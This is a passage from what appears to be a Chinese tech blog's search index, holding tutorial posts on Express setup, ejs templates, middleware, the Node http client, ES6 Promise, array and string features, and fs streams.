123456789D:\Git-Repository\NEMBlogPS&gt;supervisor appRunning node-supervisor with program &apos;app&apos; --watch &apos;.&apos; --extensions &apos;node,js&apos; --exec &apos;node&apos;Starting child process with &apos;node app&apos;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从一个博客说起(1)Expresss初识]]></title>
      <url>%2F2016%2F12%2F30%2F%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E8%AF%B4%E8%B5%B7(1)Express%E5%88%9D%E8%AF%86%2F</url>
      <content type="text"><![CDATA[0x00 安装 Express使用 Express 的前提是，已经安装了 Node.js : 12npm install -g express --save// 全局安装 Express 并将其保存到依赖列表中： 0x01 使用 Express 生成器通过应用生成器工具 express 可以快速创建一个应用的骨架。 1234npm install express-generator -g// 全局安装生成器express -e NEMBlog//当前工作目录下创建一个命名为 blog 的应用,并制定模板引擎为 ejs 生成如下目录和文件: 123456789101112131415161718192021222324252627282930λ express -e NEMBlog D:\Git-Repository\NEMBlogPS&gt;express -e . warning: option `--ejs&apos; has been renamed to `--view=ejs&apos;destination is not empty, continue? [y/N] y create : . create : ./package.json create : ./app.js create : ./public create : ./public/images create : ./public/stylesheets create : ./public/stylesheets/style.css create : ./public/javascripts create : ./routes create : ./routes/index.js create : ./routes/users.js create : ./views create : ./views/index.ejs create : ./views/error.ejs create : ./bin create : ./bin/www install dependencies: &gt; cd . &amp;&amp; npm install run the app: &gt; SET DEBUG=nemblog:* &amp; npm start 12345678910cd blog // 进入应用目录npm install// 安装相关依赖set DEBUG=blog// 设置测试模式npm start// 启动应用// DEBUG=blog npm start(Mac or Linux)//启动这个应用 当看到如下信息，代表启动成功: 12345678910D:\blogλ set BEBUG=blogD:\blogλ npm start&gt; blog@0.0.0 start D:\blog&gt; node ./bin/wwwGET / 200 1442.953 ms - 170GET /stylesheets/style.css 200 41.876 ms - 111 访问 localhost:300 可看到 Express 的欢迎页面。 0x02 工程结构如此，我们使用 Express 初始化了一个工程项目。该工程项目的内部结构如下: 12345678910111213141516D:\blogλ ls 目录: D:\blogMode LastWriteTime Length Name---- ------------- ------ ----d---- 2016/12/30 16:16 bind---- 2016/12/30 16:34 node_modulesd---- 2016/12/30 16:16 publicd---- 2016/12/30 16:16 routesd---- 2016/12/30 16:16 views-a--- 2016/12/30 16:16 1257 app.js-a--- 2016/12/30 16:16 324 package.json app.js: 启动文件。 packages.json: 存储与工程相关的信息及模块依赖。当在 dependecies 中添加依赖的模块时，运行 npm install,npm 会检查当前目录下的 package.json，并自动安装所有指定的模块。 node_modules: 存放 package.json 中安装的模块。 public: 存放 image,css,js等文件。 routes：存放路由文件。 views: 存放视图文件，或者说模块文件。 bin: 存放启动项目的脚本文件。比如，当我们运行 npm start 的时候实际上运行的是 node ./bin/www 命令。 app.js我们来看一下 app.js 文件中的内容: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061D:\blogλ cat .\app.js// 加载依赖库var express = require(&apos;express&apos;);var path = require(&apos;path&apos;);var favicon = require(&apos;serve-favicon&apos;);var logger = require(&apos;morgan&apos;);var cookieParser = require(&apos;cookie-parser&apos;);var bodyParser = require(&apos;body-parser&apos;);// 加载路由控制var index = require(&apos;./routes/index&apos;);var users = require(&apos;./routes/users&apos;);// 创建项目实例var app = express();// 定义EJS模板引擎和模板文件位置，也可以使用ejs或其他模型引擎// view engine setupapp.set(&apos;views&apos;, path.join(__dirname, &apos;views&apos;));app.set(&apos;view engine&apos;, &apos;jade&apos;);// uncomment after placing your favicon in /public// 定义 icon 图标//app.use(favicon(path.join(__dirname, &apos;public&apos;, &apos;favicon.ico&apos;)));// 定义日志和输出级别app.use(logger(&apos;dev&apos;));// 定义数据解析器app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: false &#125;));// 定义cookie解析器app.use(cookieParser());// 定义静态文件目录app.use(express.static(path.join(__dirname, &apos;public&apos;)));// 匹配路径和路由app.use(&apos;/&apos;, index);app.use(&apos;/users&apos;, users);// catch 404 and forward to error handler// 404 错误处理app.use(function(req, res, next) &#123; var err = new Error(&apos;Not Found&apos;); err.status = 404; next(err);&#125;);// error handler// 生产环境，500 错误处理和错误堆栈跟踪app.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&apos;env&apos;) === &apos;development&apos; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&apos;error&apos;);&#125;);// 输出模型module.exports = app; wwwbin/www 是一个 node 脚本文件，用于分离配置和启动程序: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192D:\blog\binλ cat www#!/usr/bin/env node/** * Module dependencies.(依赖加载) */var app = require(&apos;../app&apos;);var debug = require(&apos;debug&apos;)(&apos;blog:server&apos;);var http = require(&apos;http&apos;);/** * Get port from environment and store in Express.(自定义启动端口) */var port = normalizePort(process.env.PORT || &apos;3000&apos;);app.set(&apos;port&apos;, port);/** * Create HTTP server.(创建 HTTP 服务器实例) */var server = http.createServer(app);/** * Listen on provided port, on all network interfaces.(启动网络服务监听端口) */server.listen(port);server.on(&apos;error&apos;, onError);server.on(&apos;listening&apos;, onListening);/** * Normalize a port into a number, string, or false.(标准化函数) */function normalizePort(val) &#123; var port = parseInt(val, 10); if (isNaN(port)) &#123; // named pipe return val; &#125; if (port &gt;= 0) &#123; // port number return port; &#125; return false;&#125;/** * Event listener for HTTP server &quot;error&quot; event.（http 异常事件处理程序） */function onError(error) &#123; if (error.syscall !== &apos;listen&apos;) &#123; throw error; &#125; var bind = typeof port === &apos;string&apos; ? &apos;Pipe &apos; + port : &apos;Port &apos; + port; // handle specific listen errors with friendly messages switch (error.code) &#123; case &apos;EACCES&apos;: console.error(bind + &apos; requires elevated privileges&apos;); process.exit(1); break; case &apos;EADDRINUSE&apos;: console.error(bind + &apos; is already in use&apos;); process.exit(1); break; default: throw error; &#125;&#125;/** * Event listener for HTTP server &quot;listening&quot; event.(事件绑定函数) */function onListening() &#123; var addr = server.address(); var bind = typeof addr === &apos;string&apos; ? &apos;pipe &apos; + addr : &apos;port &apos; + addr.port; debug(&apos;Listening on &apos; + bind);&#125; 0x03 关于静态目录可以通过 Express 中的 express.static 内置中间件函数设置静态目录。将包含静态资源的目录的名称传递给 express.static 中间件函数便可以直接访问图像、CSS 文件和 JavaScript 文件之类的静态文件。 几个路径问题 dirname,filename, process.cwd() , ./, ../假如 app.js 文件位于 ` 下,我们在app.js` 中运行如下代码: 123456789101112131415161718server.listen(7880, function()&#123; console.log(&apos;Web Server Start&apos;); console.log(&apos;__dirname:&apos;+ __dirname) console.log(&apos;__filename:&apos; + __filename) console.log(&apos;process.cwd:&apos; + process.cwd()) console.log(&apos;./&apos;+ path.resolve(&apos;./&apos;)); console.log(&apos;../:&apos;+ path.resolve(&apos;../&apos;))&#125;);// path.resolve(&apos;./&apos;) 可以将(./)等转换为绝对路径。输出结果如下:__dirname:D:\Git-Repository\GoChat__filename:D:\Git-Repository\GoChat\app.jsprocess.cwd:D:\Git-Repository\GoChat./D:\Git-Repository\GoChat../:D:\Git-Repository 如此得出如下结果: __dirname: 当前文件所在文件夹的绝对路径 __filename: 当前文件的绝对路径 process.cwd():总是返回运行 node 命令时所在的文件夹的绝对路径 ./: 当前文件所在路径 ../: 当前文件的上一级路径 0x04 使用 supervisor supervisor 相当于 node 的热修复，它会监听当前目录下 node 和 js 后缀的文件，当这些文件发生改动时，supervisor 会自动重启程序,而我们不用手动重新启动整个程序。 全局安装 1npm i -g supervisor]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从一个博客说起(2)模板引擎]]></title>
      <url>%2F2016%2F12%2F30%2F%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E8%AF%B4%E8%B5%B7(2)%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%2F</url>
      <content type="text"><![CDATA[0x00 模板引擎模板引擎（Template Engine）是一个将页面模板和数据结合起来生成 html 的工具。 模板引擎有很多种，ejs 是其中一种，我们将在项目中使用这种模板引擎: 1npm i ejs --save 比如现在有一个 Express 项目的 app.js 文件: 123const app = express();app.set(&apos;views&apos;, path.join(__dirname, &apos;views&apos;));// 设置存放模板文件的目录app.set(&apos;view engine&apos;, &apos;ejs&apos;);// 设置模板引擎为 ejs 通过 app.set 设置模板引擎为 ejs 和存放模板的目录。 然后当我们通过浏览访问网站的时候，Express 将会通过路由解析响应的 url，这时我们就可以使用 res.render 函数渲染 ejs 模板了。 12345678910var express = require(&apos;express&apos;);var router = express.Router();router.get(&apos;/:name&apos;, function(req, res) &#123; res.render(&apos;users&apos;, &#123; name: req.params.name &#125;);&#125;);module.exports = router; res.render 的作用就是将模板和数据结合生成 html，同时设置响应头中的 Content-Type: text/html，告诉浏览器我返回的是 html，不是纯文本，要按 html 展示。 ejs 有三种标签: &lt;% code %&gt;：运行 JavaScript 代码，不输出 &lt;%= code %&gt;：显示转义后的 HTML内容 &lt;%- code %&gt;：显示原始 HTML 内容]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从一个博客说起(2)Express中间件]]></title>
      <url>%2F2016%2F12%2F30%2F%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E8%AF%B4%E8%B5%B7(3)Express%E4%B8%AD%E9%97%B4%E4%BB%B6%2F</url>
      <content type="text"><![CDATA[0x00 中间件Express 使用中间件(middleware) 来处理请求，当一个中间件处理完，可以通过调用 next() 传递给下一个中间件，如果没有调用 next()，则请求不会往下传递，如内置的 res.render 其实就是渲染完 html直接返回给客户端，没有调用 next()，便不会有传递给下一个中间件。 express@4 之前的版本基于 connect 这个模块实现的中间件的架构，express@4 及以上的版本则移除了对 connect 的依赖自己实现了。此外，中间件也是有加载顺序的。 0x01 错误处理Express 内置了一个默认的错误处理器，我们可以手动控制返回的错误内容，加载一个自定义错误处理的中间件: index.js123456789101112const express = require(&apos;express&apos;)const app = express();// 错误处理app.use(function(err, req, res,next)&#123; // err 是自定义的错误处理中间件 if (err) &#123; console.log(err.stack); &#125; res.status(500).send(&apos;Something worry&apos;)&#125;app.listen(3000);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[http模块(1)之客户端]]></title>
      <url>%2F2016%2F12%2F27%2Fhttp%E6%A8%A1%E5%9D%97(1)%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%2F</url>
      <content type="text"><![CDATA[0x00 http 模块对 HTTP 客户端的支持http 模块提供了创建HTTP客户端对象的方法，使用客户端对象可以创建对HTTP服务的访问。 我们有两种方式去创建出一个 HTTP 客户端。 http.request 和 http.get，以向服务器发送请求。 http.get()方法实际上是一个快捷方法，因为在HTTP请求中，使用最多的是没有报文体的 GET 请求，所以Node提供了这个简便的方法。和 http.request()不同点在于，这个方法会自动设置HTTP请求方式为 GET，并自动调用req.end()方法。 http.request() 创建 HTTP 客户端http.request(optons [, callback]) 方法用于创建HTTP请求，该方法会返回一个 http.ClientRequest 对象的实例。 ClientRequest 实例是一个可写流对象。当使用POST请求给服务器发送数据时，就要将其写入到 ClientRequest 对象。 此外,options 可以是一个对象或一个字符串。如果 options 是一个字符串, 它将自动使用 url.parse() 解析。如果是一个对象，可能包含以下值： host：请求的服务器域名或 IP 地址。默认：localhost hostname：用于支持 url.parse()。hostname优于host port：远程服务器端口。 默认： 80. localAddress：用于绑定网络连接的本地接口 socketPath：Unix域socket（使用host:port或socketPath） method：HTTP请求方法。默认：GET。 path：请求路径。默认：’/‘。如果有查询字符串（查询参数），则需要包含。例如 /index.html?page=12。请求路径包含非法字符时抛出异常。目前，只有空格不支持，以后可能改变。 headers：包含请求头的对象 auth：用于计算认证头的基本认证，即 user:password agent：控制Agent的行为。当使用了一个Agent的时候，请求将默认为 Connection: * keep-alive。可能的值为： undefined (default)：在这个主机和端口上使用 global Agent Agent object：在Agent中显式使用 passed false：选择性停用连接池，默认请求为：Connection: close keepAlive：{Boolean} 用于保持资源池周围的socket，未来可能会用于其它请求。默认值为false。 keepAliveMsecs：{Integer} 使用HTTP KeepAlive的时候，通过正在保持活动的sockets发送TCP KeepAlive包的频繁程度。默认值为1000。仅当keepAlive为true时才可用。 0x01 http.ClientRequest 客户端请求对象http.ClientRequest 对象由 http.request() 或者 http.get() 创建后返回。其表示的是一个 正在处理的 HTTP 请求 ，其头部已经进入请求队列，但是依然可以通过 setHeader(name, value),getHeader(name),removeHeader(name) 等对其进行修改。实际的头部会随着第一个数据块发送，或在连接关闭时发送。 http.request() 方法的 callback 参数或response事件监听器，获得的是服务端响应对象，即 http.IncomingMessage 实例。 在 response 事件期间，可以为响应对象添加监听器，尤其是监听 data 事件，即可获取服务端响应数据。如果没有添加 response 处理函数，响应将被完全忽略。 ClientRequest 是一个 Writable Stream，同时还是一个 EventEmitter。 http.ClientRequest 中的事件response 事件监听函数 function (response) { }。当接收到请求的响应时触发，该事件只被触发一次。response 参数是 http.IncomingMessage 的一个实例。 socket 事件监听函数 function (socket) { } Socket 附加到这个请求的时候触发。 connect 事件监听函数 function (response, socket, head) { }每次服务器使用 CONNECT 方法响应一个请求时触发。如果该事件未被监听，接收 CONNECT 方法的客户端将关闭它们的连接。 http.ClientRequest 中的方法request.write(chunk, [encoding])发送一块请求体。通过多次调用这个函数，用户可以流式地发送请求体至服务器。在这种情况下，创建请求时建议使用 [&#39;Transfer-Encoding&#39;, &#39;chunked&#39;] 头。 参数：chunk 必须是Buffer或字符串。encoding 参数是可选的, 只能在 chunk 是 string 类型的时候才能设置，默认是 utf8。 request.end([data], [encoding])结束发送请求。如果请求体中还有未发送数据，该函数将会把它们flush到流中。 如果指定了 data，那么相当于 先调用 request.write(data, encoding) 方法，再调用 request.end() 方法。 request.abort()终止一个请求。 request.setTimeout(timeout, [callback])一旦一个套接字被分配给该请求并且完成连接，socket.setTimeout() 将会被调用。 0x02 创建一个HTTP客户端创建一个HTTP客户端，GET 请求 baidu.com网站的根目录： 12345678910111213141516171819&apos;use strict&apos;;let http = require(&apos;http&apos;)let options = &#123; host:&apos;itbilu.com&apos;, method:&apos;GET&apos;, path:&apos;/&apos;&#125;let req = http.request(options)req.on(&apos;response&apos;, function (res) &#123; res.setEncoding(&apos;utf-8&apos;) res.on(&apos;data&apos;, function (chunk) &#123; console.log(&apos;收到数据: %s&apos;,chunk); &#125;)&#125;)req.end()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(16)Promise]]></title>
      <url>%2F2016%2F12%2F26%2FES6(16)Promise%2F</url>
      <content type="text"><![CDATA[0x00 初见 PromisePromise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。 在传统的 Node 异步编程中，比如按照一定顺序去读取多个文件进行异步操作时，很容易陷入 回调地狱。 12345678910var fs = require(&apos;fs&apos;);fs.readFile(&quot;fileName1&quot;, function (err, data) &#123; if (!err)&#123; fs.readFile(&quot;fileName1&quot;, function (err,data) &#123; if (!err)&#123; // ...... &#125; &#125;) &#125;&#125;); 本节不会去深究 Promise 的底层实现，而是讨论如何使用 Promise 对象去进行异步操作。 Promise 的两个特点: 对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：Pending（进行中）、Resolved（已完成，又称 Fulfilled）和Rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。 一旦状态改变，就不会在变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从Pending变为Resolved和从Pending变为Rejected。 有了 Promise 对象，便可以将异步操作以同步操作的流程表达出来，避免回调地狱。 当然，Promise 也是有缺点的，就是在于其状态的不可中断特性。因为在实际的开发过程中，是很有可能需要去中断这个状态的。 0x01 使用 PromiseES6规定，Promise对象是一个构造函数，用来生成Promise实例。其接受两个resolve 和 reject 函数作为参数。 resolve 函数的在异步操作成功时调用，并将异步操作成功的结果作为参数传递出去。而 reject 函数在异步操作失败时调用，并将异步操作失败时返回的结果作为参数传递出去。这两个函数，由JavaScript引擎提供，不用自己部署。 以下代码创建 Promise 实例: 1let promise = new Promise(function (resolve, reject)&#123;&#125;) Promise实例生成以后，可以用then方法分别指定Resolved状态和Reject状态的回调函数。 12345promise.then(function (value) &#123;// success&#125;,function (err) &#123;// error&#125;); then 接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为Resolved时调用，第二个回调函数是Promise对象的状态变为Reject时调用,而第二个参数是可选的。这两个函数都接受Promise对象传出的值作为参数。 Promise 一旦创建便会立即执行: 12345678910111213141516let promise = new Promise(function (resolve, reject)&#123; console.log(&apos;Promise&apos;); resolve();&#125;);promise.then(function (value) &#123;// success console.log(&quot;Resolved&quot;);&#125;,function (err) &#123;// error&#125;);console.log(&quot;hi&quot;);//Promise//hi//Resolved 使用 Promise 发送 Ajax 请求12345678910111213141516171819202122232425262728let getJSON = function (url) &#123; return new Promise(function (resolve, reject) &#123; let client = new XMLHttpRequest(); client.open(&quot;GET&quot;, url, true); client.onreadystatechange = handler; client.responseType = &quot;json&quot;; client.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;) client.send(); function handler () &#123; if (this.readyState!== 4)&#123; return; &#125; if (this.status === 200)&#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125; &#125;);&#125;;getJSON(url).then(function (json) &#123; console.log(&quot;Contents: &quot; + json);&#125;, function (err) &#123; console.log(&quot;Error: &quot; + err);&#125;); 注意，在 getJSON 内部，在 then 方法中，调用函数 resolve 和函数 reject 时都带有参数，而在这些参数都将会被传递个回调函数。reject函数的参数通常是 Error 对象的实例，表示抛出的错误；resolve 函数的参数除了正常的值以外，还可能是另一个 Promise 实例。 源代码 Promise.prototype.then()then() 方法的作用是为 Promise 实例添加状态改变时的回调函数。在函数执行完成以后then 方法会返回一个新的 Promise 实例，以形成链式调用。 12345getJSON(url).then( value =&gt; value.commentURl).then( value =&gt; console.log(vlaue), err =&gt; console.log(err)); Promise.prototype.catch()catch() 方法是 then(null, rejection) 方法的别名。通常来说，我们并不建议直接在 then() 方法中去处理异步操作可能产生的错误，即不要在 then 方法里面定义 Reject 状态的回调函数（即then的第二个参数）而是使用 catch 方法去捕获错误。 首先，Promise 对象中的错误具有冒泡性质，错误会一直向后传递。其次，Promise 对象中的错误也不会传递到外层代码中去，如果不使用 catch 方法，是不会捕获到错误的。这跟传统的 try/catch 代码块不同。 12345678910111213141516// badpromise .then(function(data) &#123; // success &#125;, function(err) &#123; // error &#125;);// goodpromise .then(function(data) &#123; //cb // success &#125;) .catch(function(err) &#123; // error &#125;); Node 中的 unhandledRejection 事件，专门用来监听为处理的 reject 错误: 123process.on(&apos;unhandledRejection&apos;, function (err, p) &#123; console.error(err.stack)&#125;); 其接受两个参数,第一个是错误对象，第二个是报错的Promise实例。 0x02 不存在与 ES6 中的 Promise 方法 done()done() 方法用于捕获 Promise 回调链尾部可能抛出的任何错误: 1234567Promise.prototype.done = function (resolve, reject) &#123; this.then(resolve, reject) .catch(function (reason)&#123; // 抛出一个全局错误 setTimeout( () =&gt; &#123; throw reason;&#125;, 0); &#125;);&#125;; finally()finally() 方法用于指定不管Promise对象最后状态如何，都会执行的操作。其接受一个普遍的回调函数作为参数。 1234567Promise.prototype.finally = function (callback)&#123; let P = this.constructor; return this.then(&#123; value =&gt; P.resolve(callback()).then( () =&gt; value), reason =&gt; P.resolve(callback()).then( () =&gt; &#123;throw reason&#125;) &#125;);&#125;; 0x03 应用 加载图片将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化。 12345678const preLoadImagePro = function (path) &#123; return new Promise(function (resolve, reject) &#123; let image = new Image(); image.onload = resolve; image.onerror = reject; image.src = path; &#125;)&#125; 构建顺序执行异步任务1234var sequence = Promise.resolve();array.forEach(function(item) &#123; sequence = sequence.then(//deal item)&#125;);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(11)Set和Map]]></title>
      <url>%2F2016%2F12%2F26%2FES6(11)Set%E5%92%8CMap%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(7)数组的扩展]]></title>
      <url>%2F2016%2F12%2F26%2FES6(7)%E6%95%B0%E7%BB%84%E7%9A%84%E6%89%A9%E5%B1%95%2F</url>
      <content type="text"><![CDATA[0x00 Array.from()Array.from 方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）。 比如函数的内部对象，arguments 是一个类数组对象，我们可以通过 Array.from 将其转换为数组对象: 12345function calArguments (arr)&#123; return Array.from(arguments).map( (x) =&gt; x * 2 )&#125;console.log(calArguments(1,2,3)); 同样我们还可以将可迭代的对象转换为数组比如 NodeList 对象: 12 0x01 Array.of()Array.of() 方法同样是 ES6 中的 API 方法，用于将一组数值转换为数组 12let a = Array.of(3,5,6);console.log(a) 0x02 数组的实例方法 Array.copyWithin()Array.copyWithin(target [,start][,end]) 接收三个参数，后两个参数是可选的。用于替换数组，从 target 位置开始。 Array.find()Array.find(function (value, index, arr){}) 用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为 true 的成员，然后返回该成员。如果没有符合条件的成员，则返回 undefined。 Array.fill()Array.fill(context[,start][,end]) 用于填充数组。 1234let arr = [1,2,3,4];arr.fill(&quot;Jack&quot;, 1, 2);console.log(arr);//[1, &quot;Jack&quot;, 3, 4]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[fs模块(3)读写数据流stream]]></title>
      <url>%2F2016%2F12%2F25%2Ffs%E6%A8%A1%E5%9D%97(3)%E8%AF%BB%E5%86%99%E6%95%B0%E6%8D%AE%E6%B5%81stream%2F</url>
      <content type="text"><![CDATA[0x00 stream流是一个抽象接口，在 Node.js 中它借助于多种对象实现。例如，一个对HTTP服务器的请求是一个流， 可以是 stdout(标准输出流)。流是可读的，可写的，或两者兼备。而所有的流都是 EventEmitter 的实例。 Node.js 中的很多模块都是用到了流，例如 http 和 fs 模块。例如在文件系统模块（fs）中， 我们可以通过流来创建读写文件数据的实例。 fs 模块提供了创建文件可读流与创建文件可写流的方法：fs.createReadStream() 和 fs. createWriteStream()，这两个方法分别分返回一个 Readable Stream 对象和 Writable Stream 对象。通过这两个对象，我们可以进行基于流的文件处理，在读写大文件时及基于流的转接、暂停、读取等操作方面有很大的作用。 0x01 创建可读流方法 fs.createReadStream()fs.createReadStream(path[, options]) 该方法会读取指定文件，并返货一个 ReadStream 对象。 path: 要创建可读流的文件的路径。 options: 创建选项，可以一个字符串或对象。 其中 options 的默认值如下: 1234567&#123; flags: &apos;r&apos;, encoding: null, fd: null, mode: o0666, autoClose: true&#125; options 选项中还可以包含 start 和 end 选项，用于设置读取文件的位置范围，而不是读取整个文件。 encoding 可以是：utf8、ascii、base64。 如果提供了文件描述符 f 的值，ReadStream 将会忽略 path 参数并从文件描述创建可读流。但种创建方法不会触发任何 open 事件。 可读流对象 fs.ReadStream使用 fs.createReadStream() 方法以后便会返回一个 ReadStream 实例，该对象是一个 ReadStream。该可读流对象不同于其它可读流的一点是，该对象包含一个 open 事件。 我们可以通过 fs.ReadStream 对象的构造方法或者使用 fs.createReadStream() 方法得到一个 ReadStream 实例。 12345678910const fs = require(&apos;fs&apos;);const stream = fs.ReadStream(&apos;sample.txt&apos;);//const stream = fs.createReadStream(&apos;sample.txt&apos;)stream.setEncoding(&apos;utf-8&apos;);stream.on(&apos;data&apos;, chunk =&gt; &#123; console.log(&apos;read some data&apos;);&#125;);stream.on(&apos;close&apos;, () =&gt; &#123; console.log(&apos;all the data is read&apos;)&#125;) 如上，我们创建了一个可读流，并在流读取文件的过程中监听事件，在收到新数据时触发事件数据。 当文件读取完成后触发关闭事件。 在流中，我们可以按照自己的方式去处理数据，但是最好在数据事件接收到数据的时候处理它。如果想要读取所有的数据，则必须将其拼接到一个变量中： 1234567891011const fs = require(&apos;fs&apos;);const stream = fs.ReadStream(&apos;sample.txt&apos;);let data = &apos;&apos;stream.setEncoding(&apos;utf-8&apos;);stream.on(&apos;data&apos;, chunk =&gt; &#123; data += chunk; console.log(&apos;read some data&apos;);&#125;);stream.on(&apos;close&apos;, () =&gt; &#123; console.log(&apos;all the data is read&apos;)&#125;) 当文件很大的时候，就会触发多个data事件，这就需要开发者可以在以接收到数据的时候就做一些事情， 而不是等到整个文件都读取完成。 0x02 创建可写流方法 fs.createWriteSream()fs.createStreamWrite(paht[, options]) 如上，该方法创建一个 WriteStream 对象，options 是创建选项，可以是一个字符或者对象。其默认值如下: 123456&#123; flags: &apos;w&apos;, defaultEncoding: &apos;utf-8&apos;, fd: null, mode: o0666&#125; 像 ReadStream 对象一样，如果提供了文件描述符 fd 的值，WriteStream 将忽略 path 参数并从文件描述符中创建可写流。当这种创建方式不会触发 open 事件。 可写流对象 fs.WriteStream使用 fs.createWriteStream() 方法以后便会返回一个 WriteStream 实例，该对象是一个WriteStream。同样，该对象包含一个 open 事件。 我们可以通过 fs.WriteStream 对象的构造方法或者使用 fs.createWriteStream() 方法得到一个 WriteStream 实例。使用 stream ，我们可以很方便的读入文件，然后将写入另一文件。 1234567891011const fs = require(&apos;fs&apos;)let readStream = fs.ReadStream(&apos;sample.txt&apos;)let writeStream = fs.WriteStream(&apos;out.txt&apos;)readStream.setEncoding(&apos;utf-8&apos;)readStream.on(&apos;data&apos;, chunk =&gt; &#123; writeStream.write(chunk)&#125;)readStream.on(&apos;close&apos;, () =&gt; &#123; writeStream.end()&#125;) 如上，当接收到 data 事件的时候，我们便将数据写入到可写流 writeStream 中，这非常的高效， 因为只要从可读文件接收到数据事件，数据就会被写入文件。尤其是对大文件而言，不会被阻塞。因此， 对于网络和文件系统中移动数据而言，流的方式非常的高效。 当然，我们后边将会介绍 管道(pipe) 的概念，当 流 遇上 管道，世界会清爽很多。 0x03 流(stream)与管道(pipe)在输入和输出之间通过管道传输数据在Node.js中是很常见的，这就像水管之于水流，水流从一端流经水管，水管在内部将水流改变成不同的形状，然后通过水管的另一端流出。 针对此，node.js 提供了连接两个可读和可写流并在它们之间通过管道传输数据的方法 pip() 。 例如：readStream.pipe(writeStream)。 所以在 Node.js 中，读写文件还可以使用”流”来描述: 1234&apos;use strict&apos;let fs = require(&apos;fs&apos;)fs.createReadStream(&apos;./input.txt&apos;).pipe(fs.createWriteStream(&apos;./out.txt&apos;)) 如上，我们创建了一个读取流和一个写入流，将 input.txt 文件中内容通过管道(pip)输入到 out.txt 中。从语法形式上可以看到 数据流 从 fs.createReadStream 创建然后经过 pipe 流出，最后到 fs.createWriteStream。 当然这只是基于 Node.js 强大的流特性一个及其简单的例子。基于流我们可以构建和创造更多复杂和高效的代码或工具，比如 Gulp 就是完全基于 Node.js 流之上的一个非常优秀的构建工具。 我们再来看下面一个例子: 123456789101112131415161718192021/** * Created by onejustone on 2017/1/2. */&apos;use strict&apos;;let fs = require(&apos;fs&apos;)let through = require(&apos;through2&apos;)fs.createReadStream(&apos;./in.txt&apos;) .pipe(through.obj(function (contents, enc ,done) &#123; if( enc === &apos;buffer&apos;) &#123; contents = contents.toString(&apos;utf-8&apos;) enc = &apos;utf-8&apos; &#125; done(null, contents, enc)&#125;)).pipe(through.obj(function (contents, enc, done) &#123; done(null, contents.toUpperCase(), enc)&#125;)).pipe(through.obj(function (contents, enc, done) &#123; contents = contents.split(&quot;&quot;).reverse().join(&quot;&quot;) done(null, contents, enc)&#125;)).pipe(fs.createWriteStream(&quot;./out.txt&quot;)) 如上，我们通过 Node.js的 through2 库（这是一个针对“流”的包装库），将输入流一步步转换成输出流，在中间的 pipe 中我们先是将 Buffer 转成 String，然后将它变成大写，最后再 reverse 然后传给输出流。 所以如果 in.txt 的文件内容是 hello world，那么 out.txt 的文件内容将是： DLROW OLLEH。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(4)字符串扩展]]></title>
      <url>%2F2016%2F12%2F25%2FES6(4)%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A9%E5%B1%95%2F</url>
      <content type="text"><![CDATA[0x00 字符串遍历接口ES6 为字符串添加了遍历器接口，使得字符串可以使用 for...of 循环遍历。 12345for (let codePoint of &apos;foo&apos;)&#123; console.log(codePoint)// &apos;f&apos;// &apos;o&apos;// &apos;o/ 0x01 模板字符串 Template StringES6 新特性，增强型模板字符串，使用反引号(`)标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。 123456789let basket = &#123; count:3, onSale:5&#125;$(&quot;#result&quot;).append(` There are &lt;b&gt;$&#123;basket.count&#125;&lt;/b&gt; items in your basket, &lt;em&gt;$&#123;basket.onSale&#125;&lt;/em&gt; are on sale!`) 模板字符串中嵌入变量，需要将变量名写在 ${} 之中。 模板字符串中的所有的空格，新行，缩进都会原样输出在生成的字符串中。 其实，不只是变量，大括号内部可以放入任意的JavaScript表达式，可以进行运算，以及引用对象属性。 标签模板 Tagged Template模板字符串还可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串。这被称为 标签模板 功能（tagged template）。 标签模板其实不是模板，而是函数调用的一种特殊形式。标签 指的就是函数，紧跟在后面的模板字符串就是它的参数。 比如: 1234alert`123`// 等同于 alert(123) 但，若是 “标签” 之后又有变量，那就不是那么简单的了。 123let a = 5let b = 10tag`hello $&#123;a +b&#125; world $&#123;a * b&#125;` 如上 tag 是一个函数,整个表达式的返回值，就是tag函数处理模板字符串后的返回值。变量替换只发生在数组的第一个成员与第二个成员之间、第二个成员与第三个成员之间，以此类推。 tag 函数的第一个参数是一个数组，该数组的成员是模板字符串中那些没有变量替换的部分。 tag 函数的其他参数，都是模板字符串各个变量被替换后的值。 tag 函数所有参数的实际值如下: 第一个参数: [&#39;hello&#39;, &#39;world&#39;, &#39; 